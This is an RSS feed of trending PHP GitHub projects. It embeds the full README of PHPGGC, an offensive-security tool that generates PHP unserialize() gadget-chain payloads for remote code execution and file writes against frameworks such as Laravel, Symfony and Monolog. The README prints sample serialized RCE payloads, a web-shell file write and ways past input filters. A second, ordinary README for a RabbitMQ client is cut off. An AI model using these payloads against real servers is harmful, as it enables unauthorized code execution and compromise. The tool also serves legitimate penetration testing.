<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PHP Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-10-29T01:59:05Z</updated>
  <subtitle>Weekly Trending of PHP in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>ambionics/phpggc</title>
    <updated>2023-10-29T01:59:05Z</updated>
    <id>tag:github.com,2023-10-29:/ambionics/phpggc</id>
    <link href="https://github.com/ambionics/phpggc" rel="alternate"></link>
    <summary type="html">&lt;p&gt;PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PHPGGC: PHP Generic Gadget Chains&lt;/h1&gt; &#xA;&lt;p&gt;&lt;em&gt;PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically&lt;/em&gt;. When encountering an unserialize on a website you don&#39;t have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. It can be seen as the equivalent of &lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;frohoff&#39;s ysoserial&lt;/a&gt;, but for PHP. Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.&lt;/p&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;PHP &amp;gt;= 5.6 is required to run PHPGGC.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;Run &lt;code&gt;./phpggc -l&lt;/code&gt; to obtain a list of gadget chains:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./phpggc -l&#xA;&#xA;Gadget Chains&#xA;-------------&#xA;&#xA;NAME                                      VERSION                                              TYPE                   VECTOR         I    &#xA;Bitrix/RCE1                               17.x.x &amp;lt;= 22.0.300                                   RCE (Function call)    __destruct          &#xA;CakePHP/RCE1                              ? &amp;lt;= 3.9.6                                           RCE (Command)          __destruct          &#xA;CakePHP/RCE2                              ? &amp;lt;= 4.2.3                                           RCE (Function call)    __destruct          &#xA;CodeIgniter4/FR1                          4.0.0 &amp;lt;= 4.3.6                                       File read              __toString     *    &#xA;CodeIgniter4/RCE1                         4.0.2 &amp;lt;= 4.0.3                                       RCE (Function call)    __destruct          &#xA;CodeIgniter4/RCE2                         4.0.0-rc.4 &amp;lt;= 4.3.6                                  RCE (Function call)    __destruct          &#xA;CodeIgniter4/RCE3                         4.0.4 &amp;lt;= 4.3.6                                       RCE (Function call)    __destruct          &#xA;CodeIgniter4/RCE4                         4.0.0-beta.1 &amp;lt;= 4.0.0-rc.4                           RCE (Function call)    __destruct          &#xA;CodeIgniter4/RCE5                         -4.1.3+                                              RCE (Function call)    __destruct          &#xA;CodeIgniter4/RCE6                         -4.1.3 &amp;lt;= 4.2.10+                                    RCE (Function call)    __destruct          &#xA;Doctrine/FW1                              ?                                                    File write             __toString     *    &#xA;Doctrine/FW2                              2.3.0 &amp;lt;= 2.4.0 v2.5.0 &amp;lt;= 2.8.5                       File write             __destruct     *    &#xA;Doctrine/RCE1                             1.5.1 &amp;lt;= 2.7.2                                       RCE (PHP code)         __destruct     *    &#xA;Doctrine/RCE2                             1.11.0 &amp;lt;= 2.3.2                                      RCE (Function call)    __destruct     *    &#xA;Dompdf/FD1                                1.1.1 &amp;lt;= ?                                           File delete            __destruct     *    &#xA;...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Filter gadget chains:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./phpggc -l laravel&#xA;&#xA;Gadget Chains&#xA;-------------&#xA;&#xA;NAME             VERSION            TYPE                   VECTOR        I    &#xA;Laravel/RCE1     5.4.27             RCE (Function call)    __destruct         &#xA;Laravel/RCE10    5.6.0 &amp;lt;= 9.1.8+    RCE (Function call)    __toString         &#xA;Laravel/RCE2     5.4.0 &amp;lt;= 8.6.9+    RCE (Function call)    __destruct         &#xA;Laravel/RCE3     5.5.0 &amp;lt;= 5.8.35    RCE (Function call)    __destruct    *    &#xA;Laravel/RCE4     5.4.0 &amp;lt;= 8.6.9+    RCE (Function call)    __destruct         &#xA;Laravel/RCE5     5.8.30             RCE (PHP code)         __destruct    *    &#xA;Laravel/RCE6     5.5.* &amp;lt;= 5.8.35    RCE (PHP code)         __destruct    *    &#xA;Laravel/RCE7     ? &amp;lt;= 8.16.1        RCE (Function call)    __destruct    *    &#xA;Laravel/RCE8     7.0.0 &amp;lt;= 8.6.9+    RCE (Function call)    __destruct    *    &#xA;Laravel/RCE9     5.4.0 &amp;lt;= 9.1.8+    RCE (Function call)    __destruct         &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Every gadget chain has:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Name: Name of the framework/library&lt;/li&gt; &#xA; &lt;li&gt;Version: Version of the framework/library for which gadgets are for&lt;/li&gt; &#xA; &lt;li&gt;Type: Type of exploitation: RCE, File Write, File Read, Include...&lt;/li&gt; &#xA; &lt;li&gt;Vector: the vector to trigger the chain after the unserialize (&lt;code&gt;__destruct()&lt;/code&gt;, &lt;code&gt;__toString()&lt;/code&gt;, &lt;code&gt;offsetGet()&lt;/code&gt;, ...)&lt;/li&gt; &#xA; &lt;li&gt;Informations: Other informations about the chain&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Use &lt;code&gt;-i&lt;/code&gt; to get detailed information about a chain:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./phpggc -i symfony/rce1&#xA;Name           : Symfony/RCE1&#xA;Version        : 3.3&#xA;Type           : rce&#xA;Vector         : __destruct&#xA;Informations   : &#xA;Exec through proc_open()&#xA;&#xA;./phpggc Symfony/RCE1 &amp;lt;command&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For RCE gadgets, the executed command can have 3 formatting types depending on how the gadget works:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;RCE (Command): &lt;code&gt;./phpggc Symfony/RCE1 id&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;RCE (PHP code): &lt;code&gt;./phpggc Symfony/RCE2 &#39;phpinfo();&#39;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;RCE (Function call): &lt;code&gt;./phpggc Symfony/RCE4 system id&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Once you have selected a chain, run &lt;code&gt;./phpggc &amp;lt;gadget-chain&amp;gt; [parameters]&lt;/code&gt; to obtain the payload. For instance, to obtain a payload for Monolog, you&#39;d do:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./phpggc monolog/rce1 assert &#39;phpinfo()&#39;&#xA;O:32:&#34;Monolog\Handler\SyslogUdpHandler&#34;:1:{s:9:&#34;*socket&#34;;O:29:&#34;Monolog\Handler\BufferHandler&#34;:7:{s:10:&#34;*handler&#34;;r:2;s:13:&#34;*bufferSize&#34;;i:-1;s:9:&#34;*buffer&#34;;a:1:{i:0;a:2:{i:0;s:10:&#34;phpinfo();&#34;;s:5:&#34;level&#34;;N;}}s:8:&#34;*level&#34;;N;s:14:&#34;*initialized&#34;;b:1;s:14:&#34;*bufferLimit&#34;;i:-1;s:13:&#34;*processors&#34;;a:2:{i:0;s:7:&#34;current&#34;;i:1;s:6:&#34;assert&#34;;}}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For a file write using SwiftMailer, you&#39;d do:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ echo &#39;It works !&#39; &amp;gt; /tmp/data&#xA;$ ./phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data&#xA;O:13:&#34;Swift_Message&#34;:8:{...}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Wrapper&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;--wrapper&lt;/code&gt; (&lt;code&gt;-w&lt;/code&gt;) option allows you to define a PHP file containing the following functions:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;process_parameters(array $parameters)&lt;/code&gt;: Called right &lt;strong&gt;before&lt;/strong&gt; &lt;code&gt;generate()&lt;/code&gt;, allows to change parameters&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;process_object(object $object)&lt;/code&gt;: Called right &lt;strong&gt;before&lt;/strong&gt; &lt;code&gt;serialize()&lt;/code&gt;, allows to change the object&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;process_serialized(string $serialized)&lt;/code&gt;: Called right &lt;strong&gt;after&lt;/strong&gt; &lt;code&gt;serialize()&lt;/code&gt;, allows to change the serialized string&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For instance, if the vulnerable code looks like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php&#xA;$data = unserialize($_GET[&#39;data&#39;]);&#xA;print $data[&#39;message&#39;];&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You could use a &lt;code&gt;__toString()&lt;/code&gt; chain, wrapping it like so:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php&#xA;# /tmp/my_wrapper.php&#xA;function process_object($object)&#xA;{&#xA;    return array(&#xA;        &#39;message&#39; =&amp;gt; $object&#xA;    );&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And you&#39;d call phpggc like so:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./phpggc -w /tmp/my_wrapper.php slim/rce1 system id&#xA;a:1:{s:7:&#34;message&#34;;O:18:&#34;Slim\Http\Response&#34;:2:{...}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;PHAR(GGC)&lt;/h2&gt; &#xA;&lt;h3&gt;History&lt;/h3&gt; &#xA;&lt;p&gt;At BlackHat US 2018, @s_n_t released PHARGGC, a fork of PHPGGC which instead of building a serialized payload, builds a whole PHAR file. This PHAR file contains serialized data and as such can be used for various exploitation techniques (&lt;code&gt;file_exists&lt;/code&gt;, &lt;code&gt;fopen&lt;/code&gt;, etc.). The paper is &lt;a href=&#34;https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It&#39;s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Implementation&lt;/h3&gt; &#xA;&lt;p&gt;PHAR archives come in three different formats: &lt;strong&gt;PHAR, TAR, and ZIP&lt;/strong&gt;. The three of them are supported by PHPGGC. Polyglot files can be generated using &lt;code&gt;--phar-jpeg&lt;/code&gt; (&lt;code&gt;-pj&lt;/code&gt;). Other options are available (use &lt;code&gt;-h&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;h3&gt;Examples&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ # Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar&#xA;$ ./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id&#xA;$ # Creates a PHAR file in the ZIP format and stores it in /tmp/z.zip.phar&#xA;$ ./phpggc -p zip -o /tmp/z.zip.phar monolog/rce1 system id&#xA;$ # Creates a polyglot JPEG/PHAR file from image /tmp/dummy.jpg and stores it in /tmp/z.zip.phar&#xA;$ ./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Encoders&lt;/h2&gt; &#xA;&lt;p&gt;Arguments allow to modify the way the payload is output. For instance, &lt;code&gt;-u&lt;/code&gt; will URL encode it, and &lt;code&gt;-b&lt;/code&gt; will convert it to base64. &lt;strong&gt;Payloads often contain NULL bytes and cannot be copy/pasted as-is&lt;/strong&gt;. Use &lt;code&gt;-s&lt;/code&gt; for a soft URL encode, which keeps the payload readable.&lt;/p&gt; &#xA;&lt;p&gt;The encoders can be chained, and as such &lt;strong&gt;the order is important&lt;/strong&gt;. For instance, &lt;code&gt;./phpggc -b -u -u slim/rce1 system id&lt;/code&gt; will base64 the payload, then URLencode it twice.&lt;/p&gt; &#xA;&lt;h2&gt;Advanced: Enhancements&lt;/h2&gt; &#xA;&lt;h3&gt;Fast destruct&lt;/h3&gt; &#xA;&lt;p&gt;PHPGGC implements a &lt;code&gt;--fast-destruct&lt;/code&gt; (&lt;code&gt;-f&lt;/code&gt;) flag, that will make sure your serialized object will be destroyed right after the &lt;code&gt;unserialize()&lt;/code&gt; call, and not at the end of the script. &lt;strong&gt;I&#39;d recommend using it for every &lt;code&gt;__destruct&lt;/code&gt; vector&lt;/strong&gt;, as it improves reliability. For instance, if PHP script raises an exception after the call, the &lt;code&gt;__destruct&lt;/code&gt; method of your object might not be called. As it is processed at the same time as encoders, it needs to be set first.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./phpggc -f -s slim/rce1 system id&#xA;a:2:{i:7;O:18:&#34;Slim\Http\Response&#34;:2:{s:10:&#34;...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;ASCII Strings&lt;/h3&gt; &#xA;&lt;p&gt;Uses the &lt;code&gt;S&lt;/code&gt; serialization format instead of the standard &lt;code&gt;s&lt;/code&gt;. This replaces every non-ASCII char to an hexadecimal representation: &lt;code&gt;s:5:&#34;A&amp;lt;null_byte&amp;gt;B&amp;lt;cr&amp;gt;&amp;lt;lf&amp;gt;&#34;;̀&lt;/code&gt; -&amp;gt; &lt;code&gt;S:5:&#34;A\00B\09\0D&#34;;&lt;/code&gt; This can be useful when for some reason non-ascii characters are not allowed (NULL BYTE for instance). Since payloads generally contain them, this makes sure that the payload consists only of ASCII values. &lt;em&gt;Note: this is experimental and it might not work in some cases.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Armor Strings&lt;/h3&gt; &#xA;&lt;p&gt;Uses the &lt;code&gt;S&lt;/code&gt; serialization format instead of the standard &lt;code&gt;s&lt;/code&gt;. This replaces every char to an hexadecimal representation: &lt;code&gt;s:5:&#34;A&amp;lt;null_byte&amp;gt;B&amp;lt;cr&amp;gt;&amp;lt;lf&amp;gt;&#34;;̀&lt;/code&gt; -&amp;gt; &lt;code&gt;S:5:&#34;\41\00\42\09\0D&#34;;&lt;/code&gt; This comes handy when a firewall or PHP code blocks strings. &lt;em&gt;Note: this is experimental and it might not work in some cases.&lt;/em&gt; &lt;em&gt;Note: this makes each string in the payload grow by a factor of 3.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Plus Numbers&lt;/h3&gt; &#xA;&lt;p&gt;Sometimes, PHP scripts verify that the given serialized payload does not contain objects by using a regex such as &lt;code&gt;/O:[0-9]+:&lt;/code&gt;. This is easily bypassed using &lt;code&gt;O:+123:...&lt;/code&gt; instead of &lt;code&gt;O:123:&lt;/code&gt;. One can use &lt;code&gt;--plus-numbers &amp;lt;types&amp;gt;&lt;/code&gt;, or &lt;code&gt;-n &amp;lt;types&amp;gt;&lt;/code&gt;, to automatically add these &lt;code&gt;+&lt;/code&gt; signs in front of symbols. For instance, to obfuscate objects and strings, one can use: &lt;code&gt;--n Os&lt;/code&gt;. Please note that since PHP 7.2, only &lt;code&gt;i&lt;/code&gt; and &lt;code&gt;d&lt;/code&gt; (float) types can have a &lt;code&gt;+&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Testing your chain&lt;/h3&gt; &#xA;&lt;p&gt;To test if the gadget chain you want to use works in the targeted environment, jump to your environment&#39;s folder and run the chain argument-free, with the &lt;code&gt;--test-payload&lt;/code&gt; option.&lt;/p&gt; &#xA;&lt;p&gt;For instance, to test if &lt;code&gt;Monolog/RCE2&lt;/code&gt; works on Symfony &lt;code&gt;4.x&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ composer create-project symfony/website-skeleton=4.x some_symfony&#xA;$ cd some_symfony&#xA;$ phpggc monolog/rce2 --test-payload&#xA;Trying to deserialize payload...&#xA;SUCCESS: Payload triggered !&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The exit code will be &lt;code&gt;0&lt;/code&gt; if the payload triggered, &lt;code&gt;1&lt;/code&gt; otherwise.&lt;/p&gt; &#xA;&lt;h3&gt;Testing your chain against every version of a package&lt;/h3&gt; &#xA;&lt;p&gt;If you wish to know which versions of a package a gadget chain works against, you can use &lt;code&gt;test-gc-compatibility.py&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./test-gc-compatibility.py monolog/monolog monolog/rce1 monolog/rce3&#xA;Testing 59 versions for monolog/monolog against 2 gadget chains.&#xA;&#xA;┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┓&#xA;┃ monolog/monolog ┃ Package ┃ monolog/rce1 ┃ monolog/rce3 ┃&#xA;┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━┩&#xA;│ 2.x-dev         │   OK    │      OK      │      KO      │&#xA;│ 2.3.0           │   OK    │      OK      │      KO      │&#xA;│ 2.2.0           │   OK    │      OK      │      KO      │&#xA;│ 2.1.1           │   OK    │      OK      │      KO      │&#xA;│ 2.1.0           │   OK    │      OK      │      KO      │&#xA;│ 2.0.2           │   OK    │      OK      │      KO      │&#xA;│ 2.0.1           │   OK    │      OK      │      KO      │&#xA;│ 2.0.0           │   OK    │      OK      │      KO      │&#xA;│ 2.0.0-beta2     │   OK    │      OK      │      KO      │&#xA;│ 2.0.0-beta1     │   OK    │      OK      │      KO      │&#xA;│ 1.x-dev         │   OK    │      OK      │      KO      │&#xA;│ 1.26.1          │   OK    │      OK      │      KO      │&#xA;│ 1.26.0          │   OK    │      OK      │      KO      │&#xA;│ 1.25.5          │   OK    │      OK      │      KO      │&#xA;│ 1.25.4          │   OK    │      OK      │      KO      │&#xA;                        ...&#xA;│ 1.0.1           │   OK    │      KO      │      KO      │&#xA;│ 1.0.0           │   OK    │      KO      │      KO      │&#xA;│ 1.0.0-RC1       │   OK    │      KO      │      KO      │&#xA;│ dev-main        │   OK    │      OK      │      KO      │&#xA;│ * dev-phpstan   │   OK    │      OK      │      KO      │&#xA;└─────────────────┴─────────┴──────────────┴──────────────┘&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can specify the versions you want to test by using the following syntaxe.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./test-gc-compatibility.py monolog/monolog:2.3.0,1.25.4 monolog/rce1 monolog/rce3&#xA;Testing 2 versions for monolog/monolog against 2 gadget chains.&#xA;&#xA;┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┓&#xA;┃ monolog/monolog ┃ Package ┃ monolog/rce1 ┃ monolog/rce3 ┃&#xA;┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━┩&#xA;│ 2.3.0           │   OK    │      OK      │      KO      │&#xA;│ 1.25.4          │   OK    │      OK      │      KO      │&#xA;└─────────────────┴─────────┴──────────────┴──────────────┘&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;API&lt;/h1&gt; &#xA;&lt;p&gt;Instead of using PHPGGC as a command line tool, you can program PHP scripts:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php&#xA;&#xA;# Include PHPGGC&#xA;include(&#34;phpggc/lib/PHPGGC.php&#34;);&#xA;&#xA;# Include guzzle/rce1&#xA;$gc = new \GadgetChain\Guzzle\RCE1();&#xA;&#xA;# Always process parameters unless you&#39;re doing something out of the ordinary&#xA;$parameters = $gc-&amp;gt;process_parameters([&#xA;&#x9;&#39;function&#39; =&amp;gt; &#39;system&#39;,&#xA;&#x9;&#39;parameter&#39; =&amp;gt; &#39;id&#39;,&#xA;]);&#xA;&#xA;# Generate the payload&#xA;$object = $gc-&amp;gt;generate($parameters);&#xA;&#xA;# Most (if not all) GC&#39;s do not use process_object and process_serialized, so&#xA;# for quick &amp;amp; dirty code you can omit those two &#xA;$object = $gc-&amp;gt;process_object($object);&#xA;&#xA;# Serialize the payload&#xA;$serialized = serialize($object);&#xA;$serialized = $gc-&amp;gt;process_serialized($serialized);&#xA;&#xA;# Display it&#xA;print($serialized . &#34;\n&#34;);&#xA;&#xA;# Create a PHAR file from this payload&#xA;$phar = new \PHPGGC\Phar\Tar($serialized);&#xA;file_put_contents(&#39;output.phar.tar&#39;, $phar-&amp;gt;generate());&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This allows you to tweak the parameters or write exploits more easily. &lt;em&gt;Note: This is pretty experimental at the moment, so please, report bugs&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Contributing&lt;/h1&gt; &#xA;&lt;p&gt;Pull requests are more than welcome. Please follow these simple guidelines:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;__destruct()&lt;/code&gt; is always the best vector&lt;/li&gt; &#xA; &lt;li&gt;Specify at least the version of the library you&#39;ve built the payload on&lt;/li&gt; &#xA; &lt;li&gt;Do not include unused parameters in the gadget definition if they keep their default values. It just makes the payload bigger.&lt;/li&gt; &#xA; &lt;li&gt;Respect code style: for instance, opening brackets &lt;code&gt;{&lt;/code&gt; are on a new line, and arrays should be written as &lt;code&gt;[1, 2, 3]&lt;/code&gt; instead of the old, &lt;code&gt;array(1, 2, 3)&lt;/code&gt;, notation.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Codewise, the directory structure is fairly straightforward: gadgets in &lt;em&gt;gadgets.php&lt;/em&gt;, description + logic in &lt;em&gt;chain.php&lt;/em&gt;. You can define pre- and post- processing methods, if parameters need to be modified. Hopefully, the already implemented gadgets should be enough for you to build yours. Otherwise, I&#39;d be glad to answer your questions.&lt;/p&gt; &#xA;&lt;p&gt;Please test as many versions as you can. The nomenclature for versions is as such: &lt;code&gt;[-]&amp;lt;lower-version&amp;gt; &amp;lt;= &amp;lt;higher-version&amp;gt;[+]&lt;/code&gt;. The &lt;code&gt;-&lt;/code&gt; and &lt;code&gt;+&lt;/code&gt; signs indicate that your payload may work on respectively lower and higher versions. For instance, if your gadget chain works from version 2.0.0 to version 4.4.1, which is the last version at the time, use &lt;code&gt;2.0.0 &amp;lt;= 4.4.1+&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;--new &amp;lt;framework&amp;gt; &amp;lt;type&amp;gt;&lt;/code&gt; command-line option can be used to create the directory and file structure for a new gadget chain. For instance, use &lt;code&gt;./phpggc -n Drupal RCE&lt;/code&gt; would create a new Drupal RCE gadgetchain.&lt;/p&gt; &#xA;&lt;h1&gt;Docker&lt;/h1&gt; &#xA;&lt;p&gt;If you don&#39;t want to install PHP, you can use &lt;code&gt;docker build . -t &#39;phpggc&#39;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To generate a gadget chain.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ docker run phpggc Monolog/rce1 &#39;system&#39; &#39;id&#39;&#xA;O:32:&#34;Monolog\Handler\SyslogUdpHandler&#34;:1:{s:9:&#34;*socket&#34;;O:29:&#34;Monolog\Handler\BufferHandler&#34;:7:{s:10:&#34;*handler&#34;;r:2;s:13:&#34;*bufferSize&#34;;i:-1;s:9:&#34;*buffer&#34;;a:1:{i:0;a:2:{i:0;s:2:&#34;id&#34;;s:5:&#34;level&#34;;N;}}s:8:&#34;*level&#34;;N;s:14:&#34;*initialized&#34;;b:1;s:14:&#34;*bufferLimit&#34;;i:-1;s:13:&#34;*processors&#34;;a:2:{i:0;s:7:&#34;current&#34;;i:1;s:6:&#34;system&#34;;}}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To run &lt;code&gt;test-gc-compatibility.py&lt;/code&gt; from docker.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ docker run --entrypoint &#39;./test-gc-compatibility.py&#39; phpggc doctrine/doctrine-bundle:2.2,2.7.2 doctrine/rce1 doctrine/rce2&#xA;Runing on PHP version (&#39;PHP 8.1.13 (cli) (built: Nov 30 2022 21:53:44) (NTS).&#xA;Testing 2 versions for doctrine/doctrine-bundle against 2 gadget chains.&#xA;&#xA;┏━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓&#xA;┃ doctrine/doctrine-bundle ┃ Package ┃ doctrine/rce1 ┃ doctrine/rce2 ┃&#xA;┡━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩&#xA;│ 2.2                      │   OK    │      OK       │      OK       │&#xA;│ 2.7.2                    │   OK    │      OK       │      KO       │&#xA;└──────────────────────────┴─────────┴───────────────┴───────────────┘&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;License&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ambionics/phpggc/master/LICENSE&#34;&gt;Apache License 2.0&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>php-amqplib/php-amqplib</title>
    <updated>2023-10-29T01:59:05Z</updated>
    <id>tag:github.com,2023-10-29:/php-amqplib/php-amqplib</id>
    <link href="https://github.com/php-amqplib/php-amqplib" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The most widely used PHP client for RabbitMQ&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;php-amqplib&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/php-amqplib/php-amqplib/workflows/PHPUnit%20tests/badge.svg?sanitize=true&#34; alt=&#34;PHPUnit tests&#34;&gt; &lt;a href=&#34;https://packagist.org/packages/php-amqplib/php-amqplib&#34;&gt;&lt;img src=&#34;https://img.shields.io/packagist/v/php-amqplib/php-amqplib.svg?style=flat-square&#34; alt=&#34;Latest Version on Packagist&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://packagist.org/packages/php-amqplib/php-amqplib&#34;&gt;&lt;img src=&#34;https://img.shields.io/packagist/dt/php-amqplib/php-amqplib.svg?style=flat-square&#34; alt=&#34;Total Downloads&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/php-amqplib/php-amqplib/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-LGPL_2.1-brightgreen.svg?style=flat-square&#34; alt=&#34;Software License&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://codecov.io/gh/php-amqplib/php-amqplib&#34;&gt;&lt;img src=&#34;https://codecov.io/gh/php-amqplib/php-amqplib/branch/master/graph/badge.svg?token=tgeYkUsaDM&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://scrutinizer-ci.com/g/php-amqplib/php-amqplib/code-structure&#34;&gt;&lt;img src=&#34;https://img.shields.io/scrutinizer/coverage/g/php-amqplib/php-amqplib.svg?style=flat-square&#34; alt=&#34;Coverage Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://scrutinizer-ci.com/g/php-amqplib/php-amqplib&#34;&gt;&lt;img src=&#34;https://img.shields.io/scrutinizer/g/php-amqplib/php-amqplib.svg?style=flat-square&#34; alt=&#34;Quality Score&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;This library is a &lt;em&gt;pure PHP&lt;/em&gt; implementation of the &lt;a href=&#34;http://www.rabbitmq.com/tutorials/amqp-concepts.html&#34;&gt;AMQP 0-9-1 protocol&lt;/a&gt;. It&#39;s been tested against &lt;a href=&#34;http://www.rabbitmq.com/&#34;&gt;RabbitMQ&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The library was used for the PHP examples of &lt;a href=&#34;http://manning.com/videla/&#34;&gt;RabbitMQ in Action&lt;/a&gt; and the &lt;a href=&#34;http://www.rabbitmq.com/tutorials/tutorial-one-php.html&#34;&gt;official RabbitMQ tutorials&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Please note that this project is released with a &lt;a href=&#34;https://raw.githubusercontent.com/php-amqplib/php-amqplib/master/.github/CODE_OF_CONDUCT.md&#34;&gt;Contributor Code of Conduct&lt;/a&gt;. By participating in this project you agree to abide by its terms.&lt;/p&gt; &#xA;&lt;h2&gt;Project Maintainers&lt;/h2&gt; &#xA;&lt;p&gt;Thanks to &lt;a href=&#34;https://github.com/videlalvaro&#34;&gt;videlalvaro&lt;/a&gt; and &lt;a href=&#34;https://github.com/postalservice14&#34;&gt;postalservice14&lt;/a&gt; for creating &lt;code&gt;php-amqplib&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The package is now maintained by &lt;a href=&#34;https://github.com/ramunasd&#34;&gt;Ramūnas Dronga&lt;/a&gt;, &lt;a 